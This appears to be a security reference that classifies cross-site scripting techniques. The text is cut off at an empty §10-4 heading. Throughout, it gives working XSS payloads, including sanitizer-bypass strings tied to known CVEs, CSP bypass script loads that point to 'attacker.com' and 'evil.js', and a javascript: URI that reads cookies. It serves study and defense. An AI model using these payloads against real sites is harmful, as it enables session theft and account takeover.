# XSS Mutation Taxonomy 2025
## A Comprehensive Classification of Cross-Site Scripting Attack Variations

> **Classification principle**: Sources inform the taxonomy; they do not structure it. Every technique is organized by *what structural target is mutated* and *what discrepancy it creates*, not by the paper, researcher, or tool that documented it.

---

## Taxonomy Axes

| Axis | Definition |
|------|-----------|
| **Axis 1 — Mutation Target** | What structural component is being manipulated (the PRIMARY axis) |
| **Axis 2 — Discrepancy Type** | What parsing or interpretation gap enables execution (the CROSS-CUTTING axis) |
| **Axis 3 — Attack Scenario** | The deployment context in which the mutation becomes exploitable (the MAPPING axis) |

---

## Top-Level Categories

| § | Category | Core Mutation Target |
|---|----------|---------------------|
| §1 | **Injection Context Mutations** | The HTML/JS parsing context where input lands |
| §2 | **Parser Differential & Namespace Confusion (mXSS)** | Browser DOM parse/serialize loop |
| §3 | **Encoding & Character Set Manipulations** | Character representation and normalization pipelines |
| §4 | **DOM Property & Sink Mutations** | JavaScript sinks in the live DOM |
| §5 | **JavaScript Object Graph Mutations** | Prototype chain and object property inheritance |
| §6 | **Cross-Context Messaging Mutations** | Inter-window and inter-frame communication channels |
| §7 | **CSP and Defense Mechanism Bypasses** | Policy enforcement layer |
| §8 | **Client-Side Path Traversal (CSPT) Mutations** | URL path construction in fetch/XHR calls |
| §9 | **Third-Party Component & Supply Chain Mutations** | Embedded renderers and external libraries |
| §10 | **Framework & SPA Escape Hatch Mutations** | Modern frontend framework trust boundaries |
| §11 | **Privilege Escalation Chains** | XSS as a pivot to greater impact |
| §12 | **Delivery & Persistence Mutations** | How XSS payloads are stored, reflected, or triggered |

---

## §1 — Injection Context Mutations

The most fundamental XSS dimension: the context where user-controlled data is written determines which characters are dangerous and which payloads are viable. Incorrect context identification is the root cause of the majority of XSS vulnerabilities.

### §1-1 HTML Element Context Injection

**Mechanism:** Attacker-controlled data is reflected between HTML tags (e.g., `<p>USER_DATA</p>`). Any unencoded `<` allows tag introduction. The simplest and oldest XSS injection surface.

**Example:**
```
Input:  <script>alert(1)</script>
Output: <p><script>alert(1)</script></p>
```

**Condition:** HTML entity encoding must be absent or bypassed. Attackers commonly use alternative tags when `<script>` is blocked: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`.

---

### §1-2 HTML Attribute Context Injection

**Mechanism:** User data lands inside an HTML attribute value. The injection vector depends on whether the value is quoted (single, double, or unquoted). Breaking out of the attribute boundary is required before injecting executable markup.

**Example:**
```html
<!-- Double-quoted attribute -->
<input value="USER_DATA">
<!-- Payload -->
<input value="" onmouseover="alert(1)" x="
```

**Subtypes:**

- **§1-2a Unquoted Attribute Injection:** No quotes to break out of. Any whitespace followed by an event handler name works: `<input value=x onmouseover=alert(1)>`.
- **§1-2b Event Handler Injection (same-attribute):** User data lands *inside* an event handler attribute — `<img onerror="USER_DATA">`. JavaScript execution context is already established; no tag breakout needed.
- **§1-2c href/src/action javascript: Scheme Injection:** User-controlled data populates a URL-accepting attribute. Injecting `javascript:alert(1)` causes execution on click/navigation. React blocks this for `href`, but not universally across all frameworks.

---

### §1-3 JavaScript String Context Injection

**Mechanism:** User data is reflected inside a JavaScript string literal in a `<script>` block or event handler. Payload must break out of the string and introduce executable statements.

**Example:**
```html
<script>
  var name = "USER_DATA";
</script>
<!-- Payload: "; alert(1)// -->
```

**Subtypes:**

- **§1-3a Single-Quoted String:** Same pattern with single-quote terminator.
- **§1-3b Template Literal Context:** User data appears inside backtick strings. Can inject `${alert(1)}` or break with backtick.
- **§1-3c Numeric Context Escape:** Data reflected inside a number literal. Injecting `;alert(1)//` terminates the statement and introduces code.

---

### §1-4 JavaScript Object/JSON Context Injection

**Mechanism:** Server-side code writes a user-controlled value into a JSON structure embedded in the HTML page. The target is the JSON's string or property fields.

**Example:**
```html
<script>
  var config = {"user": "USER_DATA", "admin": false};
</script>
<!-- Payload: ", "admin": true, "x": " -->
```

**Note:** Many SSR frameworks (Next.js, Nuxt) embed initial state as JSON in `<script id="__NEXT_DATA__">` blocks. Improper escaping of HTML-special characters inside JSON produces an XSS context.

---

### §1-5 CSS Context Injection

**Mechanism:** User data appears inside a `<style>` block or `style` attribute. In legacy IE, CSS `expression()` allowed JS execution. In modern browsers, the primary path is injecting a closing `</style>` tag followed by HTML.

**Example:**
```html
<style>
  body { color: USER_DATA; }
</style>
<!-- Payload: red}</style><img onerror=alert(1) src=x> -->
```

**Condition:** Modern browsers do not execute CSS `expression()`. The attack relies on tag injection through context escape.

---

### §1-6 WYSIWYG Editor / Rich Text Context Injection

**Mechanism:** Applications embedding WYSIWYG editors (TinyMCE, CKEditor, Summernote, Quill, CodeMirror) must sanitize HTML output before storage and again before rendering. These editors often use their own sanitization layers that can be bypassed directly via the "Code View" mode or by manipulating the underlying DOM. (Multiple CVEs against Summernote, TinyMCE, and similar editors documented 2023–2025, with bounties up to $8,500.)

**Example:** Enabling "Code View" in a WYSIWYG editor and entering `<img src=x onerror=alert(1)>` before the editor's output sanitization runs.

**Condition:** The editor's DOM-based sanitization is bypassed, or server-side re-sanitization is absent.

---

## §2 — Parser Differential & Namespace Confusion (mXSS)

Mutation XSS (mXSS) exploits the fact that HTML is parsed twice in common sanitizer architectures: once by the sanitizer and once by the browser when the sanitized output is assigned to `innerHTML`. When these two parse operations disagree about the structure of a document — due to foreign-content namespace rules, serialization quirks, or malformed markup repair — a payload that appears safe after sanitization can *mutate* into executable JavaScript during final rendering.

The core invariant that mXSS breaks: **sanitize(html) followed by innerHTML assignment is not idempotent for all inputs.**

### §2-1 Namespace Confusion via Foreign Content (MathML/SVG)

**Mechanism:** HTML parsers switch behavior when they encounter `<math>` or `<svg>` elements, entering "foreign content" mode where parsing rules differ from standard HTML. In particular, `<style>` inside MathML is parsed as containing arbitrary child elements (foreign content rules), while `<style>` in HTML can only contain text. Serializing and re-parsing the DOM exploits this mismatch.

**Example:**
```html
<math><mtext><table><mglyph><style><!--</style>
<img title="-->&lt;img src=1 onerror=alert(1)&gt;">
```

The sanitizer sees a harmless style element. During browser re-parse after `innerHTML` assignment, the MathML namespace context causes `</style>` to behave differently, breaking the comment and activating the `onerror` attribute.

**Condition:** Sanitizer performs parse-serialize-parse cycle (e.g., DOMPurify's standard usage pattern).

---

### §2-2 Form and Table Element Ownership Mutation

**Mechanism:** HTML prohibits nested `<form>` elements, and `<table>` elements have strict content models. When invalid nesting is parsed, browsers repair the DOM by relocating elements. On re-serialization and re-parse, the element's effective parent changes (an "ownership mutation"), placing previously-safe content into a new, dangerous context.

**Example:** Constructing markup where a `<style>` element's effective parent changes from a foreign-content context to HTML context on the second parse, causing previously-ignored text to be treated as CSS that breaks containment.

**Condition:** Sanitizer allows `<form>`, `<table>`, or similar layout elements; browser performs ownership mutation during re-parse.

---

### §2-3 XML Processing Instruction Confusion

**Mechanism:** The XML parser treats `<?xml-stylesheet ... ?>` as a processing instruction terminated by `?>`. The HTML parser, upon encountering `<?`, creates a "bogus comment" terminated by `>` instead of `?>`. This discrepancy means content between `>` and `?>` is interpreted differently: a sanitizer scanning as HTML may treat it as a comment, while the browser — if the document is loaded as XML-like content — may allow elements after the `>`.

**Example (CVE-2024-based pattern):**
```html
<?xml-stylesheet >
<img src=x onerror="alert('DOMPurify bypassed!!!')">
?>
```

**Condition:** Sanitizer does not scan processing instruction nodes (`NodeFilter.SHOW_PROCESSING_INSTRUCTION` absent from sanitizer's TreeWalker configuration).

---

### §2-4 CDATA Section Parser Differential

**Mechanism:** CDATA sections `<![CDATA[...]]>` are valid in XML and SVG/MathML foreign content, but have no special meaning in HTML. A sanitizer operating in an XML mode accepts CDATA, while the HTML browser re-parser ignores the CDATA markers and treats content as regular HTML text. Injecting `]]>` inside a CDATA section causes the browser to terminate the section unexpectedly.

**Example:**
```html
<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></svg>
```

---

### §2-5 Desanitization via Post-Sanitization DOM Manipulation

**Mechanism:** An application sanitizes HTML and then performs a DOM transformation on the sanitized output (renaming elements, moving nodes, wrapping content) before rendering. This post-sanitization mutation can change namespace context or escape containment, reintroducing XSS. A sanitized `<svg>` element renamed to `<custom-svg>` loses its SVG namespace context; if later re-inserted into an SVG subtree, child elements may behave differently.

**Example:** Application renames `<svg>` to `<proton-svg>` for custom element registration. On re-rendering, the element is inserted back into an SVG context, changing the namespace of its children and enabling `<style>` to escape containment.

---

### §2-6 Template Literal Regex Bypass (CVE-2025-26791)

**Mechanism:** DOMPurify < 3.2.4 used a regular expression to strip template literals from attribute values. The regex was insufficiently strict, allowing crafted inputs with escaped backticks or incomplete `${...}` patterns to survive sanitization. When the browser parses the surviving template expression inside SVG `<desc>` or `<title>` elements, mutation resolves the expression into an executable event attribute.

**Example (CVE-2025-26791):**
```html
<svg><desc>\onload=\${alert(1)}\</desc></svg>
```

**Condition:** DOMPurify version < 3.2.4 with SVG profile enabled.

---

## §3 — Encoding & Character Set Manipulations

Encoding mutations exploit discrepancies between how an encoding/decoding layer, a WAF, or a sanitizer processes character representations versus how the browser ultimately interprets them. The core principle: **validation operates on one representation; rendering operates on another.**

### §3-1 HTML Entity Encoding Variants

**Mechanism:** HTML entities (`&#x3C;`, `&#60;`, `&lt;`) represent the same characters as literal `<` and `>`. Filters may match literal characters but miss encoded forms, or vice versa. Mixing decimal, hexadecimal, and named entities defeats simple pattern matching.

**Example:**
```
&#x6A;avascript:alert(1)   →  javascript:alert(1)
&#106;avascript:alert(1)   →  javascript:alert(1)
```

**Condition:** Context-specific: entity encoding is decoded by the browser only in certain contexts (attribute values, text nodes — not inside `<script>` blocks where entities are literal).

---

### §3-2 Unicode Normalization & Best-Fit Mapping

**Mechanism:** Unicode defines several normalization forms (NFC, NFKD, NFKC). Under NFKC/NFKD normalization, "compatibility equivalent" characters (fullwidth variants, superscripts, enclosed characters) decompose into their ASCII equivalents. A WAF or filter scanning for `<` and `>` misses their fullwidth variants `＜` (U+FF1C) and `＞` (U+FF1E). If the backend normalizes input *after* validation, the normalized output contains the blocked characters.

**Example:**
```
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
 →  NFKD normalize  →
<img src=p onerror='prompt(1)'>
```

**Condition:** WAF validates pre-normalization input; backend normalizes via NFKD/NFKC before HTML rendering. (Systematically demonstrated in WorstFit research, 2024.)

---

### §3-3 Charset Confusion & Byte Order Mark (BOM) Abuse

**Mechanism:** If an attacker can influence the `charset` parameter in a response (e.g., via user-controlled `Content-Type` or `charset` query parameter), the browser may interpret the page as UTF-16 or UTF-32, causing ASCII XSS payloads to be invisible to filters operating in UTF-8 while remaining executable in the browser's non-UTF-8 context. The Byte Order Mark (BOM: `0xFE 0xFF` for UTF-16 BE) at the start of a page overrides declared charset in some browsers.

**Example (UTF-16 BE):**
```
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```
Filters scanning for `<svg` in UTF-8 see random bytes; the UTF-16-aware browser executes `<svg/onload=alert()>`.

---

### §3-4 Double/Multi-Level URL Encoding

**Mechanism:** URL parameters decoded once by the server still contain percent-encoded characters if the value was double-encoded (`%253C` → server decodes to `%3C` → browser decodes to `<`). WAFs often decode only once. Similarly, client-side JavaScript may decode a URL parameter and write it to the DOM, adding another decode pass not visible to server-side validation.

**Example:**
```
?param=%253Cscript%253Ealert(1)%253C%252Fscript%253E
  Server decodes once: %3Cscript%3Ealert(1)%3C%2Fscript%3E
  Browser/JS decodes:  <script>alert(1)</script>
```

**Condition:** Multi-layer decoding architecture where validation occurs at a different decode level than rendering.

---

### §3-5 Charset Encoding Conversion Exploitation

**Mechanism:** When applications transcode strings between encodings (e.g., Windows-1252 → UTF-8 → ASCII//TRANSLIT), characters that have no direct equivalent are substituted by visually similar characters. The sequence: inject a Unicode character that *looks like* `<` in the source charset; the transcoding chain converts it to literal `<` in the output. Filters operating before transcoding see a harmless character; output renders a `<`.

**Example (PHP):**
```php
$str = htmlspecialchars($_GET["str"]);         // Encodes < to &lt;
$str = iconv("Windows-1252", "UTF-8", $str);  // &lt; survives
$str = iconv("UTF-8", "ASCII//TRANSLIT", $str); // ‹ → <  (translit maps ‹ to <)
```

---

### §3-6 Whitespace, Comment, and Syntax Noise Injection

**Mechanism:** HTML and JavaScript parsers are highly tolerant of whitespace variations, null bytes, and browser-specific comment syntax. Inserting unusual characters between keywords defeats string-matching filters without affecting browser execution.

**Examples:**
```html
<scr\x09ipt>alert(1)</script>       <!-- Tab inside tag name -->
<img/src=x/onerror=alert(1)>        <!-- / as whitespace substitute -->
<a aa aaa aaaa href=javascript:alert(1)>  <!-- Junk attributes -->
<!--><script>alert(1)</script>       <!-- HTML comment bypass -->
<ScRiPt>alert(1)</ScRiPt>           <!-- Mixed case -->
```

---

## §4 — DOM Property & Sink Mutations

DOM-based XSS occurs entirely in the browser: user-controlled input flows from a *source* (a location where tainted data enters JavaScript) to a *sink* (a function or property that causes execution). No server-side response reflection is required.

### §4-1 innerHTML / outerHTML Sinks

**Mechanism:** Assigning a string containing HTML markup to `element.innerHTML` causes the browser to parse and render that markup, executing any event handlers or script elements. This is the most common DOM XSS sink.

**Sources:** `location.search`, `location.hash`, `document.referrer`, `localStorage`, API responses rendered directly into the DOM.

**Example:**
```javascript
document.getElementById("output").innerHTML = location.search.slice(1);
// URL: ?<img src=x onerror=alert(1)>
```

---

### §4-2 eval() and Dynamic Code Execution Sinks

**Mechanism:** `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`, and similar functions execute a string as JavaScript. When user-controlled data reaches these sinks, arbitrary JS executes.

**Example:**
```javascript
eval("var x = " + location.hash.slice(1));
// URL: #1;alert(1)
```

**Variants:** `new Function(payload)()`, `window[atob('ZXZhbA==')]()`, `document.write(payload)`.

---

### §4-3 Location/Navigation Sinks (javascript: URI)

**Mechanism:** Assigning to `location.href`, `location.assign()`, or `window.open()` with a `javascript:` scheme URI causes JS execution in the current page's context.

**Example:**
```javascript
location.href = userInput;
// Input: javascript:alert(document.cookie)
```

**Condition:** Many modern frameworks (React ≥ 16.9) block `javascript:` in controlled attributes but not necessarily in dynamic assignments.

---

### §4-4 document.write() and writeln() Sinks

**Mechanism:** `document.write()` injects raw HTML markup into the page. When user-controlled data is passed without sanitization, any HTML/JS is rendered. Often found in legacy pages and Google Analytics-based code patterns.

---

### §4-5 Script src / Link href Dynamic Loading Sinks

**Mechanism:** JavaScript that dynamically creates `<script>` or `<link>` elements and sets their `src`/`href` from user-controlled values causes external script loading or stylesheet injection. Prototype pollution gadgets commonly target this sink (§5).

**Example:**
```javascript
var s = document.createElement("script");
s.src = config.transport_url;  // config.transport_url polluted via §5
document.head.appendChild(s);
```

---

### §4-6 Attribute Injection Sinks (setAttribute)

**Mechanism:** `element.setAttribute("eventhandler", userInput)` where the attribute name is also user-controlled, or where user input reaches a known dangerous attribute (e.g., `onclick`, `onload`). Less common but can arise in template engines and dynamic UI builders.

---

### §4-7 Web Worker & Service Worker Script Injection

**Mechanism:** `new Worker(url)` and `navigator.serviceWorker.register(url)` load JavaScript from a URL. If the URL parameter is user-controlled, an attacker can point it to an attacker-controlled script. Service Workers persist after the tab closes and can intercept future requests.

---

## §5 — JavaScript Object Graph Mutations

These techniques manipulate the JavaScript prototype chain or DOM interface properties to place attacker-controlled values into locations that legitimate application code later reads and passes to dangerous sinks — without the attacker directly touching those sinks.

### §5-1 Client-Side Prototype Pollution → XSS Gadget

**Mechanism:** A prototype pollution *source* allows an attacker to add arbitrary properties to `Object.prototype` (e.g., via `__proto__[property]=value` in a URL parameter, `constructor[prototype][property]=value`, or a JSON merge operation). Application code or third-party libraries later read these inherited properties and pass them to dangerous sinks — the *gadgets*.

**Example Source:**
```
/?__proto__[transport_url]=data:,alert(1);
```
A library reads `config.transport_url` (inheriting the polluted value) and appends a `<script src="...">` element with that URL.

**Common gadget sinks:** Google Analytics `sequence`/`event_callback` (eval), jQuery Mobile popup (innerHTML), `script.src` (external load), `iframe.srcdoc` (HTML injection).

**Condition:** A recursive object merge, URL query-to-object parser, or JSON deep-merge exists in the page's JavaScript.

---

### §5-2 DOM Clobbering → Variable Override → XSS

**Mechanism:** The browser exposes named HTML elements as properties of `window` and `document`. An attacker with HTML injection (but not full XSS) can create elements whose `id` or `name` attributes shadow JavaScript variables or object properties. When legitimate code reads the global variable, it receives the DOM element (or its attributes) instead of the expected value, which is then passed to a dangerous sink.

**Example:**
```html
<!-- Injected via HTML injection (sanitizer allows id and name) -->
<a id=config><a id=config name=transport_url href="data:,alert(1)">
```
Code reads `config.transport_url` → gets DOM element's `href` attribute → passed to `script.src` sink → XSS.

**Bypass pattern:** DOMPurify's `SANITIZE_DOM: false` option disables clobbering protection, re-enabling this vector.

**Real-world CVE (2024):** CVE-2024-47068 — DOM clobbering gadget in Rollup bundler output affected any application using rollup-bundled scripts.

---

### §5-3 Script Gadgets / Code Reuse Attacks

**Mechanism:** If a strict CSP prevents loading external scripts or executing inline code, an attacker can instead inject HTML elements that trigger functionality in *already-loaded, CSP-whitelisted scripts*. These "script gadgets" are pieces of legitimate library code that, when activated via HTML injection, pass attacker-controlled values to dangerous sinks — without injecting new JavaScript.

**Example:** Injecting `<div data-expression="alert(1)">` into a page that uses a math-calculator library. The library reads `element.getAttribute("data-expression")` and passes it to `eval()`. XSS executes without any `<script>` tag or external resource load.

**Gadgets found in the wild:** jQuery Mobile popup widget (innerHTML via comment injection), Angular 1.x expressions (arbitrary JS in `{{ }}`), Google Tag Manager `sequence` (eval), Apache Cordova event handlers.

---

### §5-4 AngularJS Sandbox Escape (Legacy)

**Mechanism:** AngularJS 1.x implemented a sandbox to prevent arbitrary JavaScript in template expressions `{{ }}`. The sandbox could be escaped by exploiting access to `Function.prototype.constructor`, overriding sandbox enforcement functions, or abusing Angular's expression parser to chain property accesses until a code execution path was reached.

**Example (classic):**
```
{{constructor.constructor('alert(1)')()}}
```

**Condition:** Applies to AngularJS 1.x. Angular 2+ completely removed the sandbox. Sites still running Angular 1.x are vulnerable.

---

## §6 — Cross-Context Messaging Mutations

Modern web applications communicate between windows, iframes, and tabs using APIs designed to cross the Same-Origin Policy (SOP) boundary safely. Misimplementation of these APIs creates XSS vectors that bypass traditional reflection-based detection.

### §6-1 postMessage Origin Validation Bypass

**Mechanism:** `window.postMessage(data, targetOrigin)` allows cross-origin messaging. When a receiver's `message` event handler does not validate `event.origin` (or validates it using a weak substring check), an attacker can send a crafted message from any origin that reaches a dangerous sink in the receiving page.

**Example (no origin check):**
```javascript
window.addEventListener("message", function(e) {
  document.getElementById("output").innerHTML = e.data.s;
  // No e.origin check → attacker can send any message
});
```

**Exploitation:** Attacker iframes the target page and sends `postMessage` with XSS payload. The target's handler writes it to `innerHTML`.

**Weak origin check bypass:**
```javascript
if (e.origin.indexOf("legitimate.com") > -1) { eval(e.data); }
// Bypassed by: e.origin = "http://evil-legitimate.com.attacker.com"
```

**Real-world (CVE-2024-49038):** Microsoft Copilot Studio — CVSS 9.3 — wildcard origin acceptance in postMessage handler led to cross-tenant XSS.

---

### §6-2 Null Origin (Sandboxed iframe) Bypass

**Mechanism:** When a page is loaded in a sandboxed `<iframe sandbox="allow-scripts">`, its `window.origin` and `e.origin` for any messages it sends are `null`. If a target site checks `e.origin === "null"` as a string match (or accepts `null` as a trusted origin), an attacker can frame the target, open a popup with null origin, and send a `null`-origin `postMessage` that bypasses the check.

**Example:**
```html
<iframe sandbox="allow-scripts allow-popups" srcdoc="
  <script>
    var w = window.open('https://target.com/listener');
    setTimeout(() => w.postMessage('XSS_PAYLOAD', '*'), 1000);
  </script>
"></iframe>
```

---

### §6-3 Window Opener / window.open() Reference Abuse

**Mechanism:** A page that opens a child window retains a reference in `window.open()`'s return value; the child can reference its parent via `window.opener`. If either page uses postMessage without origin validation, an attacker controlling one frame can influence the other. Additionally, a tab opened via `window.open()` without `noopener` can navigate its opener to an attacker-controlled URL.

---

### §6-4 WebSocket Message Source Injection

**Mechanism:** WebSocket connections receive messages that may be processed and rendered to the DOM without sanitization. If an attacker can influence WebSocket server output (through upstream injection, MITM on non-WSS connections, or server-side stored XSS into WebSocket payloads), the client rendering these messages in `innerHTML` or similar sinks executes the attacker's script.

**Condition:** WebSocket established without TLS (ws://) allows MITM; or server-side storage permits injecting payloads into WS message streams.

---

## §7 — CSP and Defense Mechanism Bypasses

Content Security Policy (CSP) is a critical browser-enforced defense layer, but misconfigurations and inherent features of the web platform create bypass paths. CSP should never be treated as the sole XSS defense.

### §7-1 Wildcard and Overly Permissive Source Directives

**Mechanism:** `script-src *` allows loading scripts from any domain. `script-src 'unsafe-inline'` allows inline scripts. `script-src 'unsafe-eval'` allows `eval()`. Any of these eliminate the protection value of CSP.

**Common misconfigurations:**
- `data:` in `script-src` allows `<script src="data:;base64,YWxlcnQoMSk=">`.
- `http:` or `https:` wildcards allow attacker-controlled CDN content.
- `script-src 'nonce-xxx' 'unsafe-inline'` — the `'unsafe-inline'` is *ignored when a nonce is present*, but many parsers implement this incorrectly.

---

### §7-2 JSONP Endpoint Abuse in Whitelisted Domains

**Mechanism:** If a trusted domain (e.g., `accounts.google.com`) is in `script-src` and that domain exposes a JSONP endpoint with a user-controlled callback parameter, an attacker can load that endpoint as a script, causing `callback=alert(1337)` to execute in the page context.

**Example:**
```
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**Condition:** Domain is in `script-src` and exposes a JSONP endpoint. JSONBee maintains a database of public JSONP endpoints on popular domains.

---

### §7-3 Open Redirect Chaining

**Mechanism:** A domain whitelisted in `script-src` has an open redirect endpoint. The attacker uses the redirect to point to a domain they control (which serves a malicious script). The browser follows the redirect, but CSP validates only the original host.

**Example:**
```
<script src="https://whitelisted.com/redirect?url=https://attacker.com/evil.js">
```

**Condition:** Whitelisted domain has open redirect; CSP does not follow redirects for validation (some browsers do, some do not).

---

### §7-4 Path Traversal in Whitelisted Domain Scripts

**Mechanism:** `script-src 'self' https://cdn.example.com/safe/'` restricts scripts to a specific path. If the CDN permits path traversal (e.g., `/../`), a crafted `src` attribute escapes the allowed directory.

**Example:**
```
<script src="https://cdn.example.com/safe/../attacker/evil.js">
```

---

### §7-5 CSP Injection via Controllable Report-URI Token

**Mechanism:** Some applications dynamically generate CSP headers and include a user-controlled token in the `report-uri` directive. By injecting semicolons and new CSP directives into this token, an attacker can override the effective CSP (e.g., adding `script-src 'unsafe-inline'`).

**Example (PortSwigger lab pattern):**
```
GET /?token=;script-src-elem%20'unsafe-inline'
```
The server generates: `Content-Security-Policy: ...; report-uri /csp?token=;script-src-elem 'unsafe-inline'`.
The injected `script-src-elem 'unsafe-inline'` directive takes effect.

---

### §7-6 CSP Report-Only Mode

**Mechanism:** `Content-Security-Policy-Report-Only` headers monitor violations without enforcing them. If a developer deploys CSP in report-only mode and never transitions to enforcement, any XSS executes unimpeded despite the CSP being "present."

---

### §7-7 DOM Clobbering to Bypass CSP (via nonce stealing)

**Mechanism:** A strict CSP with nonces prevents script injection, but if an attacker can inject HTML that clobbers `document.head` or the nonce-containing `<script>` element, they may be able to read the nonce value (which should be per-request random) from a previously rendered element and reuse it in an injected script.

**Condition:** Nonce is reflected in the HTML and accessible via DOM properties that can be read through clobbering gadgets.

---

### §7-8 Trusted Types Bypass

**Mechanism:** Trusted Types is a browser security feature that restricts which APIs can accept HTML strings. Bypasses involve finding code paths that create TrustedHTML objects from attacker-controlled input, or exploiting misconfigurations in the policy that allow `createHTML` to be called with unsanitized data.

---

## §8 — Client-Side Path Traversal (CSPT) Mutations

CSPT exploits the fact that modern single-page applications (SPAs) make API calls whose URL paths are partially constructed from user-controlled values. By injecting `../` sequences, an attacker reroutes a legitimate, authenticated API request to an unintended endpoint — without controlling the request method, body, or authentication headers.

### §8-1 CSPT → XSS (HTML Response Sink)

**Mechanism:** A fetch call constructs a URL from user input and renders the response into the DOM as HTML. By traversing to a different endpoint via `../`, the attacker routes the request to an endpoint that returns attacker-controlled HTML (e.g., a JSON endpoint that reflects user input unescaped, an uploaded file endpoint, or an open redirect). The response is inserted via `innerHTML`, causing XSS.

**Example:**
```
https://app.example.com/article/USER_INPUT/details
 → USER_INPUT: ../../../uploads/xss.json?
 → Resolves to: /uploads/xss.json?/details
 → Returns: {"name": "<img src=x onerror=alert(1)>"}
 → Written to innerHTML → XSS
```

**Condition:** Fetch response is rendered as raw HTML; an endpoint reachable via path traversal returns attacker-influenced content.

---

### §8-2 CSPT → CSRF via Rerouted Authenticated Request

**Mechanism:** A CSPT reroutes a legitimate API call (carrying session cookies and CSRF tokens) to a state-changing endpoint the attacker targets. Because the request originates from the victim's browser with all authentication headers, CSRF protections are bypassed. (CSPT2CSRF, formally presented OWASP AppSec Lisbon 2024; CVE-2023-45316 in Mattermost.)

---

### §8-3 WAF Bypass via Encoding Level Discrepancy

**Mechanism:** Web Application Firewalls often operate at a different URL decoding level than the application. Encoding `../` sequences with varying levels (`%2e%2e%2f`, `%252e%252e%252f`, `..%2f`) can bypass WAF path traversal detection while the application still resolves the traversal.

**Note:** This technique was nominated in PortSwigger's 2024 top web hacking techniques list ("Bypassing WAFs to Exploit CSPT Using Encoding Levels").

---

## §9 — Third-Party Component & Supply Chain Mutations

XSS that originates in embedded third-party components, widely-used libraries, or through supply chain compromise, often has significantly broader blast radius than application-specific XSS.

### §9-1 PDF Renderer Library XSS

**Mechanism:** PDF viewing libraries embedded in web applications (PDF.js is most prominent) parse PDF files and render them via JavaScript. Vulnerabilities in PDF parsing allow crafted PDF files to trigger JavaScript execution in the embedding application's origin — not merely in a sandboxed viewer context. Since PDF.js is used by Firefox natively and widely embedded in apps, CVE-2024-4367 (arbitrary JS via malformed FontMatrix) affected millions of users and tens of thousands of applications.

**CVE-2024-4367 (Codean Labs):** Malformed `FontMatrix` in a crafted PDF triggered arbitrary JS in Firefox and any app embedding vulnerable PDF.js (< 4.2.67). Impact: stored XSS on any domain hosting a vulnerable PDF viewer. For Electron apps with `nodeIntegration` enabled, this escalated to RCE. Patched May 2024.

**Example:** Upload a crafted PDF to an application using an unpatched PDF.js version; anyone previewing the PDF executes attacker-controlled JavaScript in the application's origin.

---

### §9-2 WYSIWYG Editor Library XSS

**Mechanism:** WYSIWYG editors (Summernote, TinyMCE, CKEditor, Quill) provide their own HTML sanitization that may differ from the application's sanitization. "Code View" mode in editors often allows raw HTML injection that bypasses the visual editor's input controls. Server-side re-sanitization of editor output is frequently absent.

**Common bypass:** Directly POSTing to the storage endpoint with crafted HTML bypasses the editor's frontend sanitization entirely, regardless of the editor's client-side filtering.

---

### §9-3 JavaScript Supply Chain Injection

**Mechanism:** Attackers compromise widely-used JavaScript libraries distributed via CDN or npm, or register abandoned packages to inject malicious code. Any application loading the compromised library from CDN without Subresource Integrity (SRI) checking executes attacker code.

**Polyfill.io supply chain attack (June 2024):** After a Chinese entity acquired the polyfill.io domain, a modified polyfill.js was served to over 100,000 websites. The payload was conditionally injected (targeting specific user agents and geographies) and performed drive-by XSS/redirect attacks. Affected sites included Hulu, Mercedes-Benz, and WarnerBros.

**Condition:** No SRI (`integrity` attribute) on `<script>` or `<link>` tags loading from external CDNs; no monitoring of CDN-hosted dependency content.

---

### §9-4 Markdown Parser / Static Site Generator XSS

**Mechanism:** Markdown parsers that allow raw HTML pass-through (a common configuration in marked.js, showdown, commonmark) render user-supplied HTML elements directly. Applications using these parsers for user-generated content without an additional sanitization pass are vulnerable to stored XSS via markdown.

**Example (marked.js):**
```markdown
![x](x "onerror='alert(1)'" )
```
With certain parser configurations, this renders `<img src="x" title="onerror='alert(1)'" />` which may or may not execute depending on context — but more direct HTML injection is also possible if the parser allows it.

---

### §9-5 SVG/XML File Upload XSS

**Mechanism:** SVG files are XML documents that can contain JavaScript via `<script>` elements, event handlers on SVG elements, or `xlink:href` pointing to `javascript:` URIs. When an application serves user-uploaded SVG files from the same origin (or a same-site domain), the browser executes the embedded script in the application's security context.

**Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Condition:** SVG served with MIME type `image/svg+xml` from the application origin (or a trusted origin) allows script execution; serving as `application/octet-stream` forces download.

---

## §10 — Framework & SPA Escape Hatch Mutations

Modern JavaScript frameworks (React, Vue, Angular, Next.js) apply automatic output encoding by default but expose deliberate escape hatches for rendering trusted HTML. Misuse of these hatches — or vulnerabilities in the frameworks themselves — creates XSS vectors.

### §10-1 React dangerouslySetInnerHTML Misuse

**Mechanism:** React's `dangerouslySetInnerHTML={{ __html: value }}` prop bypasses React's automatic escaping and injects raw HTML directly into the DOM. When `value` contains attacker-controlled HTML that has not been sanitized, XSS results. The deliberate naming convention ("dangerous") is intended to discourage use, but does not prevent it.

**High-risk pattern:** Using `dangerouslySetInnerHTML` with output from markdown parsers (marked.js, showdown) without first passing through DOMPurify, or rendering API responses that may contain attacker-influenced data.

---

### §10-2 Vue v-html Directive Injection

**Mechanism:** Vue's `v-html` directive renders a string as raw HTML, bypassing Vue's automatic escaping. Equivalent to React's `dangerouslySetInnerHTML`. CVE-2024-6783 (Vue 2) demonstrated a vulnerability in Vue 2's template compiler that allowed XSS through crafted component definitions.

---

### §10-3 Next.js / SSR Hydration Mismatch

**Mechanism:** Server-side rendered Next.js pages embed application state as JSON in `<script id="__NEXT_DATA__">`. If this state includes user-controlled values with HTML-special characters not escaped in the JSON serialization step, an XSS payload can break out of the JSON string context into the surrounding HTML. The hydration process may then execute the payload.

**Example:** User-controlled value `</script><script>alert(1)</script>` in Next.js's `getServerSideProps` returned data, if not properly escaped during HTML serialization.

---

### §10-4 Template Engine Server-Side Injection Reflected to Client

